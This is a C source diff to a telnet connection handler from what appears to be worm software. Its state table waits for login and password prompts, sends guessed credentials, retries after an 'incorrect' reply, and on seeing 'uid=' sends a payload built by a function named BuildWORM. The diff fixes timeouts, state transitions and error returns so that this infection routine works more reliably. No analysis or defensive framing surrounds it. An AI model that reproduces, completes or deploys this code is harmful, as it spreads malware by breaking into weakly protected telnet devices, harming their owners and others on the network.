@@ -253,11 +253,11 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         struct _modules *next_module;
     } StateCommands[] = {
         // look for login request
-        { TCP_CONNECTED, "ogin:", &BuildLogin, STATE_TELNET_PASSWORD, NULL },
+        { STATE_TELNET_NEW, "ogin:", &BuildLogin, STATE_TELNET_PASSWORD, NULL },
         // look for password request..
         { STATE_TELNET_PASSWORD, "assword:", &BuildPassword, STATE_TELNET_FINDSHELL, NULL },
         // incorrect goes back to state new. so we can attempt another..
-        { STATE_TELNET_FINDSHELL, "ncorrect", NULL, TCP_CONNECTED, NULL },
+        { STATE_TELNET_FINDSHELL, "ncorrect", NULL, STATE_TELNET_NEW, NULL },
         // look for a string specifying its connected
         { STATE_TELNET_FINDSHELL, "last login", &BuildVerify, STATE_TELNET_INSIDE, NULL },
         { STATE_TELNET_FINDSHELL, "success", &BuildVerify, STATE_TELNET_INSIDE, NULL },
@@ -266,7 +266,7 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         
         // after id; we should see uid=X (means we are logged in)
         // maybe change to STATE_OK after testing.. 
-        { STATE_TELNET_INSIDE, "uid", &BuildWORM, STATE_OK, NULL },
+        { STATE_TELNET_INSIDE, "uid=", &BuildWORM, STATE_OK, NULL },
         
         // end of commands..
         { 0, NULL, NULL, 0, NULL }
@@ -274,9 +274,12 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
     
     for (i = 0; StateCommands[i].expect != NULL; i++) {
         if (StateCommands[i].state == cptr->state) {
-            ret = 1;
+            // set timestamp to now.. so the timeout works correctly
+            Cstate->ts = cur_ts;
+            cptr->start_ts = time(0);
+
             // retrieve 1 single line from the incoming queue
-            recv_line = QueueParseAscii(cptr->incoming, &line_size);
+            recv_line = NULL;//QueueParseAscii(cptr->incoming, &line_size);
             if (!recv_line && cptr->incoming && cptr->incoming->buf) {
                 recv_line = cptr->incoming->buf;
                 no_line = 1;
@@ -284,17 +287,15 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
             if (recv_line) {
                 // verify what we expect is in the line..
                 if (strcasestr(recv_line, StateCommands[i].expect) != NULL) {
+                    ret = 1;
                     cptr->state = StateCommands[i].new_state;
                     
-                    // set timestamp to now.. so the timeout works correctly
-                    Cstate->ts = cur_ts;
-                    cptr->start_ts = time(0);
 
                     if (StateCommands[i].BuildData != NULL) {
                         data = StateCommands[i].BuildData(mptr, cptr, &dsize);
                         if (data == NULL) {
                             // set as bad..
-                            ret = 0;
+                            ret = -1;
                             // connection bad happens at end of func because ret wont be 1
                             //ConnectionBad(cptr);
                             break;
@@ -325,8 +326,9 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         ret = -1;
     }
     
-    if (ret != 1)
+    if (ret < 0) {
         ConnectionBad(cptr);
+    }
     
     return ret;
 }
